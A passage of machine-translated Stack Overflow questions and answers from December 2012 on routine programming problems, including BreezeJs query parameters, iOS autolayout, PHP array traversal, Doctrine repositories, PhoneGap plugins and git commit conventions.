    PictureBox7.Left -= speedofblocks
    PictureBox8.Left -= speedofblocks
    PictureBox9.Left -= speedofblocks
    PictureBox10.Left -= speedofblocks
    PictureBox11.Left -= speedofblocks
    PictureBox12.Left -= speedofblocks
    PictureBox13.Left -= speedofblocks
    PictureBox14.Left -= speedofblocks
    PictureBox15.Left -= speedofblocks
    PictureBox16.Left -= speedofblocks
    PictureBox17.Left -= speedofblocks
    PictureBox18.Left -= speedofblocks
    PictureBox19.Left -= speedofblocks
    PictureBox20.Left -= speedofblocks
    PictureBox21.Left -= speedofblocks
    PictureBox22.Left -= speedofblocks
    PictureBox23.Left -= speedofblocks
    PictureBox24.Left -= speedofblocks
    PictureBox25.Left -= speedofblocks
    PictureBox26.Left -= speedofblocks
    PictureBox27.Left -= speedofblocks
    PictureBox28.Left -= speedofblocks
    PictureBox29.Left -= speedofblocks
    PictureBox30.Left -= speedofblocks
    PictureBox31.Left -= speedofblocks
    PictureBox32.Left -= speedofblocks
    PictureBox33.Left -= speedofblocks
    PictureBox34.Left -= speedofblocks
    PictureBox35.Left -= speedofblocks
    PictureBox36.Left -= speedofblocks
    PictureBox37.Left -= speedofblocks
    PictureBox38.Left -= speedofblocks
    PictureBox39.Left -= speedofblocks
    PictureBox40.Left -= speedofblocks
    PictureBox41.Left -= speedofblocks
    PictureBox42.Left -= speedofblocks
    PictureBox43.Left -= speedofblocks
    PictureBox44.Left -= speedofblocks

    PictureBox45.Left -= speedofblocks
    PictureBox46.Left -= speedofblocks
    PictureBox47.Left -= speedofblocks
    PictureBox48.Left -= speedofblocks
    PictureBox49.Left -= speedofblocks

End Sub

Private Sub Gravity_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Gravity.Tick
    PictureBox1.Top += 3

    For x As Integer = 1 To 49

        If PictureBox1.Bounds.IntersectsWith(floor(x).Bounds) And floor(x).Visible = True Then
            standing = True
            PictureBox1.Top -= 3
        End If

        If PictureBox1.Bounds.IntersectsWith(blocks(x).Bounds) And blocks(x).Visible = True Then
            standing = True
            PictureBox1.Top -= 3
        End If

    Next x

End Sub 
```

我很确定我搞砸了数组，以及 Bounds.Intersectswith.. 等。基本上试图获得一些基本的碰撞和重力。我制作了一堆图片框，它们都是向左滚动的黑色方块，然后我希望玩家跳过它们。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:29:23.833

正如其他人所说，Winforms 并不是最适合游戏的，它针对数据输入和静态窗口进行了更多优化。也就是说，PictureBox 控件只是将图像绘制到屏幕上的控件。您想要做的是覆盖控件/表单的默认呈现，以便您可以自己完成所有绘图。请参阅下面的链接开始。

[http://msdn.microsoft.com/en-us/library/b818z6z6.aspx](http://msdn.microsoft.com/en-us/library/b818z6z6.aspx)

# breeze - 如何在 BreezeJs 中正确发送操作参数和查询

> ID：13704466
> 
> 赞同：13
> 
> 时间：2012-12-04T13:52:10.350
> 
> 标签：breeze

## 目前，我正在调用 BreezeJs 文档/示例中显示的所有数据查询：

```
getEntityList = function (predicate) {
  var query = new entityModel.EntityQuery().from("EntityList");
  if (predicate)
    query = query.where(predicate);
  return manager.executeQuery(query);
} 
```

但是我想在返回任何可查询的结果之前将附加参数传递给控制器​​操作：

```
[AcceptVerbs("GET")]
public IQueryable<Entity> EntityList(string actionParam) {
  //here goes logic that depends on actionParam
  //and returns IQueryable<Entity>
} 
```

正如我们从文档中了解到的：

> Breeze 将查询转换为 OData 查询字符串，例如：
> 
> > ?$filter=IsArchived%20eq%20false&$orderby=CreatedAt

这就是问题开始的地方。我应该如何构建查询以将参数传递给控制器​​操作？

```
getEntityList = function (predicate, actionParam) {
  var query = new entityModel.EntityQuery().from("EntityList");
  if (predicate)
    query = query.where(predicate);
  if(actionParam)
    // ???
  return manager.executeQuery(query);
} 
```

## 我已经尝试将路线设置为：

```
routes.MapHttpRoute(
            name: "DefaultApi",
            routeTemplate: "api/{controller}/{action}/{actionParam}",
            defaults: new { query = RouteParameter.Optional }
        ); 
```

*并通过在from*部分中应用它来发送*actionParam ，*

 *```
var query = new entityModel.EntityQuery()
  .from("EntityList/" + encodeURIComponent(actionParam)); 
```

但是在某些特殊字符上编码失败，并且抛出了错误的请求。

**在这种情况下如何正确发送*actionParam ？*请帮忙。**

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-12-10T01:46:18.360

从 v 0.76.1 开始，您可以使用 EntityQuery。***withParameters***方法将附加参数传递给任何服务方法。因此，您现在可以构造一个如下所示的查询，它既传递参数又使用微风的 IQueryable 支持。

```
EntityQuery.from("EmployeesFilteredByCountryAndBirthdate")
                 .withParameters({ BirthDate: "1/1/1960", Country: "USA" })
                 .where("LastName", "startsWith", "S")
                 .orderBy("BirthDate"); 
```

你的控制器方法看起来像这样：

```
[HttpGet]
public IQueryable<Employee> EmployeesFilteredByCountryAndBirthdate(DateTime birthDate, string country) {
      return ContextProvider.Context.Employees.Where(emp => emp.BirthDate >= birthDate && emp.Country == country);
} 
```

API 文档有更多信息。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-05T00:33:30.210

更新：从 BREEZE v.0.76.1 开始，这不再是正确的答案。BREEZE 现在支持查询参数。请参阅“ ***withParameters*** ”查询子句。

Breeze 添加了对参数化查询的支持，这部分归功于 SO 上的这个问题。谢谢你。

该答案用于描述不再需要的解决方法。我已经修改了我的答案，消除了我对该解决方法的描述。*

# ios - 约束到位后无法在 layoutSubviews 中设置 UILabel#preferredMaxLayoutWidth

> ID：13704469
> 
> 赞同：2
> 
> 时间：2012-12-04T13:52:19.070
> 
> 标签：ios, ios6, uilabel, autolayout

当你继承 UIView 时，你最好的做法是什么？我正在尝试使用新的 ios 6 自动布局完全在代码中为视图控制器做一个视图。所以我继承了 UIView 并在#initWithFrame 中设置了基本约束（我应该在#updateConstraints 中这样做吗？）。问题是我有一个带有动态文本和可变宽度的 UILabel，所以我必须在约束确定框架之后设置#preferredMaxLayoutWidth，所以我认为#layoutSubviews 是这样做的最佳位置，但这样做会导致 NSInternalInconsistencyException：执行 -layoutSubviews 后仍需要自动布局。MyView 的-layoutSubviews 实现需要调用super。(RuntimeError) 在你问之前，我确定我在我覆盖的每个方法中都调用了 super。任何的想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T14:04:28.523

也许你在这里需要的是不要让你的视图调用[super layoutSubviews]，而是UIView，祖先，调用它的[super layoutSubviews]。

这不能通过子类化来实现，而是实现一个 UIView 的类别，它会实现 layoutSubViews 函数，调用 super. 如果我能得到你的代码，我本可以尝试的。[这里](http://openradar.appspot.com/12519234)有人试过成功。

同样，这并不能保证这将得到解决。Apple 论坛中似乎有很多关于此的错误报告。不幸的是，我们无法在 Apple 门户中浏览其他人的错误，我们只能[提交自己的](http://bugreport.apple.com/).

作为一种解决方法，我还建议您是否有任何约束与您的 preferredMaxLayoutWidth 参数冲突：尝试增加或减少它。根据它自己的最重要的顺序，它可以改变事情，而且谁（除了苹果）知道——它可能是固定的。手指交叉！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-24T20:02:32.373

这似乎对我有用，我无法解释为什么，但确实如此。

```
-(void)layoutSubviews
{
[super layoutSubviews];

layout code here, including updated constraints 

[super layoutSubviews];
} 
```

# sql-server - SQL Server 和自动转换？

> ID：13704481
> 
> 赞同：3
> 
> 时间：2012-12-04T13:53:01.143
> 
> 标签：sql-server, sql-server-2008

> **可能重复：**
> [有没有办法在 SQL Server 中关闭隐式类型转换？](https://stackoverflow.com/questions/7605131/is-there-a-way-to-turn-off-implicit-type-conversion-in-sql-server)

尊重 SQL Server - 它试图通过自动转换来“*帮助”我：*

我怎样才能使这样的命令*失败*？：

```
SELECT 1+1+'2'   --4
SELECT '2'+1+1   --4
SELECT 1+'2'+1   --4 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:05:22.510

你不能，虽然它是[请求的 feature](http://connect.microsoft.com/SQL/feedback/ViewFeedback.aspx?FeedbackID=260762)。这个问题已经在 SO 上讨论过：[有没有办法在 SQL Server 中关闭隐式类型转换？](https://stackoverflow.com/questions/7605131/is-there-a-way-to-turn-off-implicit-type-conversion-in-sql-server)

# ios - 如何将 UITextField 或 UITextView 添加到 UItableViewCell 并编辑内容？

> ID：13704483
> 
> 赞同：0
> 
> 时间：2012-12-04T13:53:03.063
> 
> 标签：ios, uitableview

我在两个单元格中`tableView`有一个`textField`和一个。`textView`而已。我将它们添加到`tableView:cellForRowAtIndexPath:`. 我无法编辑内容！可能触摸没有传递到文本字段和`textView`.

所有的解决方案都要求我使用带有自定义单元类的 xib。

那么我是否必须为两行创建两个新类`tableView`？

我不能通过将这些作为子视图添加到普通单元格来逃避`contentView`吗？

其次，如果`tableView`用于那种布局是矫枉过正，

我需要`textView`在带有圆角的矩形边框中的 textArea 下方以及它们之间用 plain 分隔的替代方法是什么`UIViews`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T15:40:44.300

尝试使用此代码

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    if (indexPath.row == 0){ 
        UITextField *customField = [[UITextField alloc] initWithFrame:CGRectMake(60.0f, 10.0f, 400.0f, 60.0f)]
        customField.autoresizingMask = UIViewAutoresizingFlexibleWidth;
        customField.delegate = self;
        customField.adjustsFontSizeToFitWidth = NO;
        customField.borderStyle = UITextBorderStyleNone;
        customField.autocapitalizationType = UITextAutocapitalizationTypeNone;
        customField.autocorrectionType = UITextAutocorrectionTypeNo;
        customField.enablesReturnKeyAutomatically = YES;
        customField.returnKeyType = UIReturnKeyDefault;
        customField.keyboardType = UIKeyboardTypeDefault;
        [cell addSubview:customField];

    }

    if (indexPath.row == 1){ 
        UITextView *notes = [[UITextView alloc] init];
        notes.editable = YES;
        notes.font = DEFAULT_FONT(16);
        notes.text = infoNotesStr.text;
        notes.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleRightMargin;
        notes.backgroundColor = [UIColor blueColor];
        notes.delegate = self;
        CALayer *layers = notes.layer;
        layers.cornerRadius = 10.0f;
        [cell addSubview:notes];

    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:09:31.970

您无需创建 2 个新类。添加它们就可以了，甚至可以在控制器中保留一个引用。

检查您的`UITableView`,`UITableViewCell`和您的`UITextField`和上的 userInteractionEnabled `UITextView`。如果您禁用视图的用户交互，每个子视图也将禁用它的用户交互。如果要禁用行的选择，只需设置`cell.selectionStyle = UITableViewCellSelectionStyleNone;`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:12:34.083

您不需要 xib 来继承 UITableViewCell。在这种情况下，添加到内容视图应该没问题，并且不需要子类。听起来您也确实不需要表格视图。您可能想要一个的原因是您是否需要更多这些单元格，否则常规视图控制器可能更合适且更易于实现。

我使用 Core Graphics 在 UIView 对象上创建圆角，甚至添加阴影效果，但有一点学习曲线。您可以先在 Internet 上搜索 UIView 圆角。

# python - 如何使用 easygui 将我的编码号码换行？

> ID：13704485
> 
> 赞同：2
> 
> 时间：2012-12-04T13:53:11.110
> 
> 标签：python, base64

我想`base64encode(ntei)`在“Heres the number in base 64:”下换一个新行，有人知道方法吗？

```
import easygui as e

nte = e.enterbox(msg="Enter Number to convert", title="", default="", strip=True)
ntei = int(nte)

def base64encode(number, alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):
    """Converts an integer to a base64 string."""
    if not isinstance(number, (int, long)):
        raise TypeError("Number must be an integer")

    base64 = ""
    sign = ""

    if number < 0:
        sign = "_"
        number = -number

    if 0 <= number <len(alphabet):
        return sign + alphabet[number]

    while number !=0:
        number, i = divmod(number, len(alphabet))
        base64 = alphabet[i] + base64

    return sign + base64

def base60decode(number):
    return int(number, 64)

print e.msgbox(msg=("Heres the number in base 64: " + base64encode(ntei))) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:36:33.803

问题出在`"Heres the number in base 64: " + base64encode(ntei)`. 您自己并没有在其中放置换行符，因此自然不会显示换行符。换行符通过`\n`Python 中的字符表示。因此，要向该字符串添加换行符，我们必须将其更改为`"Heres the number in base 64:\n" + base64encode(ntei)`.

还值得一提的是，您的 base64encode 函数是完全没有必要的（就像`print`在 前面使用一样`easygui.msgbox`，除非出于某种原因您想查看该函数的返回值）。您可以通过 Python 字符串的 encode 方法将字符串转换为 base64，如`ntei.encode('base64')`. 使用这些知识，您的整个程序可以重写为以下内容：

```
import easygui as e

nte = e.enterbox(msg='Enter number to convert', title='', default='', strip=True)
e.msgbox(msg=('Heres the number in base 64: ' + nte.encode('base64'))) 
```

# visual-c++ - 如何为ie的多个选项卡/窗口运行工具栏的单个实例

> ID：13704493
> 
> 赞同：1
> 
> 时间：2012-12-04T13:53:55.190
> 
> 标签：visual-c++, com, mfc

我在 VC++ 中开发了一个 Internet Explorer 工具栏，用户需要在其中登录，然后我只需在菜单中更新该用户详细信息，但每当我更改选项卡时，工具栏就会注销。如何停止为每个选项卡运行单独的工具栏实例。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T20:32:15.380

工具栏是进程内 COM 服务器，IE 本身对选项卡使用进程隔离。要使您的状态数据在选项卡关闭/崩溃时仍然存在，您需要将其移出 IE 进程并进入代理进程。您可以通过进程间通信方法之一（例如命名管道）询问代理进程来获取状态数据。

要在选项卡之间同步状态，请将数据保存到旧选项卡的[DWebBrowserEvents2 ::WindowStateChanged 事件处理程序](http://social.msdn.microsoft.com/Forums/en-US/ieextensiondevelopment/thread/b48d5558-d078-4aec-a684-6498ac2231fb)中的代理进程，并在新选项卡的 DWebBrowserEvents2 ::WindowStateChanged 事件处理程序中向代理进程询问状态数据。

# android - 适用于 Android 的 Phonegap 本地通知插件

> ID：13704495
> 
> 赞同：2
> 
> 时间：2012-12-04T13:54:02.603
> 
> 标签：android, cordova, uilocalnotification, statusbar

我正在使用 Phonegap [Cordova 2.2] 在 Android 上开发“提醒”应用程序。

用户为他的提醒输入了一个特定的日期，我应该准时通知他。

我使用这个[插件](https://github.com/phonegap/phonegap-plugins/tree/master/Android/StatusBarNotification)只是在状态栏中显示一个通知，它们工作正常。

但我希望通知在特定时间显示。有什么方法可以做到吗？

我发现这个[插件](https://github.com/phonegap/phonegap-plugins/tree/master/Android/LocalNotification)应该做我想做的，但它不工作，它显示错误：

```
import com.phonegap.api.Plugin;
import com.phonegap.api.PluginResult; 
```

导入 com.phonegap.api.Plugin 无法解析

那么，我该如何解决这个错误呢？我知道这可能很容易，但我以前从未制作过原生 Android 应用程序，所以我有点困惑。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T14:34:17.163

看起来像 2.0.0 和 2.2.0 之间的区别，并且插件需要更新。

```
import org.apache.cordova.api.CordovaPlugin;
import org.apache.cordova.api.PluginResult; 
```

这应该给你一个起点： [http ://docs.phonegap.com/en/2.2.0/guide_plugin-development_android_index.md.html#Developing%20a%20Plugin%20on%20Android](http://docs.phonegap.com/en/2.2.0/guide_plugin-development_android_index.md.html#Developing%20a%20Plugin%20on%20Android)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-13T19:53:36.147

对于新的 Phonegap 版本，您还必须更改一些内容：

1.  LocalNotification 类现在必须“扩展 CordovaPlugin”
2.  像 eomer 说的导入类
3.  LocalNotification.java 的执行方法现在必须返回一个布尔值
4.  将所有受影响的返回参数（来自 PluginResult）更改为您选择的布尔值
5.  以新的方式获取上下文`ctx = this.cordova.getActivity();`并为其赋予 ...AlarmHelper(ctx)

# node.js - 将数据从传感器推送到数据库

> ID：13704497
> 
> 赞同：1
> 
> 时间：2012-12-04T13:54:12.647
> 
> 标签：node.js, mongodb, arduino, sensors

我想将我的数据从传感器推送到非 sql 数据库。

让我概述一下我的项目大纲。

```
Sensor-->Databse-->Webserver(node.js+express)-->IOS device(RestKit) 
```

可以看出，我有一个使用 node 和 express 开发的 web 服务器。到目前为止，Web 服务器从 MongoDB 数据库中读取一个值，并将该值显示在 IOS 设备上。

我现在想将传感器中的值存储到非 SQL 数据库（最好是 MongoDB）。

为了测试整个设置，我将使用 Arduino 作为传感器来测量温度。

任何建议将不胜感激。提前非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T21:13:15.650

Arduino 硬件如何连接到系统？

如果它直接通过串口连接，您可以在以下位置重用我的部分代码： [Arduino sensor logging with collectd & RRDtool](https://github.com/jeroendoggen/Arduino-serial-messaging/tree/master/Clients/Collectd)

在此示例中，我将 Arduino 测量值写入 RRDtool 数据库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:46:24.663

您可以使用其中一种可用的 MongoDB REST 接口 (http://www.mongodb.org/display/DOCS/Http+Interface)，也可以自己编写一个非常基本的接口。

非常粗略的草图：

```
// assuming express app and mongodb native module with open collection
app.post('/datapoint', function(req, res) {
    collection.insert(req.body, function(err, record) {
      if (err) return res.send(500, err);
      res.send('Datapoint stored as ' + record.id);
    });
  });
}); 
```

# git - 如何避免开发人员在不提及 Github 上提交消息的问题的情况下提交

> ID：13704498
> 
> 赞同：5
> 
> 时间：2012-12-04T13:54:21.007
> 
> 标签：git, github, jenkins, continuous-integration

在我工作的公司，我们已经定义了一个小的开发流程来满足我们的需求。在提交之前，我们应该在提交评论中提到问题。这将在我们的 CI 上触发一些内部挂钩，并使该问题在我们的 beta 环境中可用以进行测试。

我们的项目目前托管在 GitHub 上，我们也有一个配置良好的 Jenkins CI 服务器。疑问是：**“我们如何才能强迫我们的开发人员在提交之前提及一个问题？”** . 我想知道 Git Hooks 是否可以帮助我们，但似乎钩子在开发人员机器上是本地的。

有谁知道可以帮助我们解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T15:54:57.027

我认为你的方法需要调整。当你经常提交时，Git 被设计成最好的。例如，我经常将多个文件的微小更改作为单独的提交提交。以后的更改可以被压缩或挑选、重新设置或重新排列。但是强迫每个提交都与一个问题有关只会导致更少的提交，这对您的开发人员不利。

此外，代码需要备份，如果您推送到远程服务器，这是一种将代码放在两个地方的简单方法，并且还可以在开发过程中与他人“共享”。只要它是一个单独的分支，这就是解决代码问题的好方法。

据我所知，您的问题在于粒度和 github 存储库作为“主”存储库的概念。如果您只想 -deploy- 用于一般测试处理特定问题的提交块，那么有一个 git 存储库，它会在 -every- 提交时将中央 github 存储库的副本拉到 master，但只会触发集成/当提交评论中提到问题时，部署到测试过程。这样，开发人员可以根据需要推送中间提交，可以根据需要推送开发分支，而不必意味着任何特殊，并且只有修复问题的提交块才会导致部署/集成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T16:13:37.247

我们的团队最近遇到了同样的问题，即没有参考票号的毫无价值的提交消息。

我们如何处理这件事是双重的。

1.  沟通，表达这不是正确的方法，也是无效的。
2.  使用 GitHub 拉取请求，我们拒绝将不符合我们规范的代码合并到主线中，现在包括提交消息格式，开发人员将重新设置其分支以修改提交消息以遵循标准。

我们考虑强制开发人员安装使用正则表达式来解析消息的本地钩子，但决定不采用这种方法，因为有时开发人员希望快速提交（而不是存储），他们可以稍后重新设置，而不必在本地遵循格式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-18T21:29:48.110

如果您试图强制提交消息具有特定格式（即始终以特定格式出现问题），那么预接收挂钩可能是您唯一的方法。

# php - 如何使用 php 从多维数组中获取变量？

> ID：13704503
> 
> 赞同：0
> 
> 时间：2012-12-04T13:54:37.873
> 
> 标签：php, arrays, multidimensional-array

我的数组的截图是这样的；

```
Array(
      [a] => val1 
      [b] => 
           Array(
                 [c]=>68 
          )
) 
```

我怎样才能得到变量；

> a=val1
> c=68

与 php 使用循环？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:56:54.027

看看：[http ://us.php.net/manual/en/function.http-build-query.php](http://us.php.net/manual/en/function.http-build-query.php)

它将采用一个数组（关联）并将其转换为查询字符串。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:57:07.443

```
$array = array('a' => 'val1', 'b' => array('c' => 68));
echo $array['a']; //val1
echo $array['b']['c']; //68 
```

仅输出多维数组的所有*值*：

```
function outputValue($array){
  foreach($array as $key => $value){
    if(is_array($value)){
      outputValue($value);
      continue;
    }
    echo "$key=$value" . PHP_EOL;
  }
} 
```

同样可以使用[`array_walk_recursive()`](http://php.net/manual/en/function.array-walk-recursive.php)：

```
array_walk_recursive($array, function($value, $key){echo "$key=$value" . PHP_EOL;}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:58:15.743

你会使用：

```
foreach ($x as $k=>$v) 
```

`$x`你的数组在哪里；这将遍历每个元素`$x`并分配`$k`键和`$v`值。

例如，下面是一个设置数组并显示它的代码片段：

```
$x = array('a'=>'val1', 'b'=>'val2');
foreach ($x as $k=>$v) {
    echo "$k => $v<br />";
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T14:01:46.930

您使用 PHP 函数`extract()` [http://php.net/manual/en/function.extract.php](http://php.net/manual/en/function.extract.php)

像这样：

```
<?php

$var_array = array("color" => "blue",
               "size"  => "medium",
               "shape" => "sphere");
extract($var_array);

echo "$color, $size, $shape\n";

?> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T14:10:14.353

如果您知道它的最大一个数组深度，您可以使用

```
foreach ($myArray as $key=>$val) {
  if (is_array($val) {
    foreach ($val as $key2=>$val2) {
      print $key2.'='.$val2;
    }
  } else {
    print $key.'='.$val;
  }
} 
```

如果可以更多，请使用功能

```
function printArray($ar) {
  foreach ($myArray as $key=>$val) {
    if (is_array($val) {
      printArray($val)
    } else {
      print $key.'='.$val;
    }
  }
}

printArray($myArray); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-04T14:10:51.083

如果您尝试提取变量，请尝试：

```
<?php
$array = array('a' => 'val1', 'b' => array('c' => 68));

$stack = array($array);
while (count($stack) !== 0) {
    foreach ($stack as $k0 => $v0) {
        foreach ($v0 as $k1 => $v1) {
            if (is_array($v1)) {
                $stack[] = $v1;
            } else {
                $$k1 = $v1;
            }
            unset($k1, $v1);
        }
        unset($stack[$k0], $k0, $v0);
    }
}
unset($stack); 
```

这将在当前变量范围内创建`$a`(val1) 和(68)。`$c`

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-04T14:16:30.800

您可以使用`RecursiveIteratorIterator`+`RecursiveArrayIterator`上`ArrayIterator`

示例您当前的数据

```
$data = array(
  'a' => 'val1',
  'b' => array('c'=>68)
); 
```

解决方案

```
$it = new RecursiveIteratorIterator(new RecursiveArrayIterator(new ArrayIterator($data)));
echo "<pre>";
foreach ($it as $k=> $var)
{
    printf("%s=%s\n",$k,$var);
} 
```

输出

```
a=val1
c=68 
```

[见现场演示 PHP 5.1.0 - 5.4.9](http://3v4l.org/YPiFO)

# php - Doctrine+Symfony 在错误的命名空间中搜索存储库？

> ID：13704505
> 
> 赞同：0
> 
> 时间：2012-12-04T13:54:42.070
> 
> 标签：php, symfony, doctrine

首先要说我对 Symfony 和 Doctrine 都很陌生，并且正在努力学习它。我找到了本教程[http://tutorial.symblog.co.uk/](http://tutorial.symblog.co.uk/)，它指导您在其中制作自己的博客。问题是，它是为 Symfony 2.0 设计的，而我使用的是 2.1.5。因此，在此过程中，我不得不修复由于 Symfony 和 Doctrine 中引入的更改而出现的许多问题。

但是，这个问题是我似乎无法**正确**解决的问题。它真的很短的一章，总共 10-15 行代码：

[http://tutorial.symblog.co.uk/docs/customising-the-view-more-with-twig.html#recent-comments](http://tutorial.symblog.co.uk/docs/customising-the-view-more-with-twig.html#recent-comments)

它实际上只有 1 行代码困扰我！我有一个 PageController 里面有一个动作函数：

```
public function sidebarAction()
{
    $em = $this->getDoctrine()->getEntityManager;

    $blogRep = $em->getRepository('BloggerBlogBundle:Blog');

    //........ stuff here

    $em->getRepository('BloggerBlogBundle:Comment') <--------------- THIS
} 
```

该死的东西似乎不起作用！我得到错误：

```
Fatal error: Class 'Blogger\BlogBundle\Entity\CommentRepository' not found in /home/igor/Documents/www/igor/vendor/doctrine/orm/lib/Doctrine/ORM/EntityManager.php on line 689 
```

关键点！: 类'Blogger....**实体**

它在 Entity 中搜索！

我的存储库存储在 Blogger\BlogBu​​ndle\Repository 命名空间中！最奇怪的是，它可以毫无问题地找到“BloggerBlogBu​​ndle:Blog”存储库，但没有找到评论！

两者都位于同一个文件夹中（Bundles\Blogger\BlogBu​​ndle\Repository），并且两者的声明方式完全相同：

评论库：

```
namespace Blogger\BlogBundle\Repository;

class CommentRepository extends EntityRepository 
```

博客存储库：

```
namespace Blogger\BlogBundle\Repository;

class BlogRepository extends EntityRepository 
```

## 我是如何让它发挥作用的

我将 CommentRepository 文件移动到“Entity”目录并将其命名空间更改为 Blogger\BlogBu​​ndle\Entity。那时它工作得很好。完全没有问题。但是这样我就被分散在目录和命名空间中的存储库困住了......

为什么 Doctrine 在 Blogger\BlogBu​​ndle\Repository 中找到 Blog repo 而不是 Comment repo？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:58:07.303

您的博客实体是否有 @ORM/Repository-annotation 而您的评论实体没有？

# c# - Visual Studio 2010 中的 C# 项目 for Windows Phone Notefunction

> ID：13704508
> 
> 赞同：0
> 
> 时间：2012-12-04T13:54:44.873
> 
> 标签：c#, windows, visual-studio-2010, web-services, windows-phone-7

我试图让我的便笺功能在保存便笺时使用您的 gps 坐标发布您所在的当前城市。现在它只显示“未知位置”。我现在有点迷路了，我已经用这个代码工作了很长时间，试图让它工作，所以请谁能告诉我我做错了什么？

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Shapes;
using Microsoft.Phone.Controls;
using System.Device.Location;
using System.Text;
using System.IO.IsolatedStorage;
using System.IO;
using Secret.myTerraService;

namespace Secret
{
public partial class AddNotePage : PhoneApplicationPage
{
    private IsolatedStorageSettings settings =     IsolatedStorageSettings.ApplicationSettings;
    private string location = "";

    #region Hämtar din geografiska position

    public AddNotePage()
    {
        InitializeComponent();
        GeoCoordinateWatcher watcher;

        watcher = new GeoCoordinateWatcher(GeoPositionAccuracy.Default)
                           {
                               MovementThreshold = 20
                           };

        watcher.PositionChanged += this.watcher_PositionChanged;
        watcher.StatusChanged += this.watcher_StatusChanged;
        watcher.Start();

    }
private void watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
{
switch (e.Status)
{
    case GeoPositionStatus.Disabled:
        // location is unsupported on this device
        break;
    case GeoPositionStatus.NoData:
        // data unavailable
        break;
}
}

private void watcher_PositionChanged(object sender,   GeoPositionChangedEventArgs<GeoCoordinate> e)
{
var epl = e.Position.Location;

// Access the position information thusly:
epl.Latitude.ToString("0.000");
epl.Longitude.ToString("0.000");
epl.Altitude.ToString();
epl.HorizontalAccuracy.ToString();
epl.VerticalAccuracy.ToString();
epl.Course.ToString();
epl.Speed.ToString();
e.Position.Timestamp.LocalDateTime.ToString();

}

void client_ConvertLonLatPtToNearestPlaceCompleted(object sender,   myTerraService.ConvertLonLatPtToNearestPlaceCompletedEventArgs e)
{
location = e.Result;

//throw new NotImplementedException();
}

    #endregion

    #region Knappfunktioner

    private void AppBar_Cancel_Click(object sender, EventArgs e)
    {
        navigateBack();
    }

    private void AppBar_Save_Click(object sender, EventArgs e)
    { // spara en ny anteckning
        if (location.Trim().Length == 0)
        {
            location = "Okänd Plats";
        }

        // skapa namnet på filen
        StringBuilder sb = new StringBuilder();
        sb.Append(DateTime.Now.Year);
        sb.Append("_");
        sb.Append(String.Format("{0:00}", DateTime.Now.Month));
        sb.Append("_");
        sb.Append(String.Format("{0:00}", DateTime.Now.Day));
        sb.Append("_");
        sb.Append(String.Format("{0:00}", DateTime.Now.Hour));
        sb.Append("_");
        sb.Append(String.Format("{0:00}", DateTime.Now.Minute));
        sb.Append("_");
        sb.Append(String.Format("{0:00}", DateTime.Now.Second));
        sb.Append("_");

        location = location.Replace(" ", "-");
        location = location.Replace(", ", "_");
        sb.Append(location);
        sb.Append(".txt");

        //spara filen i Isolated Storage
        var appStorage = IsolatedStorageFile.GetUserStoreForApplication();

        try
        {
            using (var fileStream = appStorage.OpenFile(sb.ToString(),  System.IO.FileMode.Create))
            {
                using (StreamWriter sw = new StreamWriter(fileStream))
                {
                    sw.WriteLine(editTextBox.Text);
                }
            }

        }
        catch
        {
            // åtgärda vid senare tillfälle..
        }

        //Klart Navigera tillbaka till NoteMainPage
        navigateBack();

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T18:09:48.333

在测试这个时，我可以看到您的代码可能会中断的几个点。您应该使用断点进行调试，以实际确认您的应用正在获取 GPS 位置数据。如果没有，请使用 Windows Phone 模拟器并运行 GPS 模拟（然后再次确认）。

接下来，一旦您知道您的 GPS 数据正在传入并为 Terra Web 服务正确格式化，请确认数据实际上正在发送到 Terra Web 服务，并且数据是从 Web 服务调用返回的。如果您的 Terra Web 服务仍然返回“未知位置”，请再试一次，但这次绘制主要城市附近的 GPS 位置，以增加 Web 服务知道您靠近哪个城市的几率。如果您仍然返回“未知位置”，那么您可以相当确定问题出在 Web 服务提供商身上。

